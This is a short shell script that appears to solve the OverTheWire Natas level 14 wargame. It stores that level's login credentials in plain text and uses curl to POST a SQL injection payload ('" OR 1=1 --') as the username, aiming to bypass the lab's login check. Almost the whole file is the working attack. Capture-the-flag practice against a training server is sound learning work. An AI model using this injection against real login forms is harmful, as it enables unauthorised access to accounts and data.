usr="natas14"
psw="Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

user1="\" OR 1=1 --"
psw1=""

curl --user "$usr:$psw" -X POST --form "username=$user1" --form "password=$psw1" -H "debug:1"  http://$usr.natas.labs.overthewire.org/ 
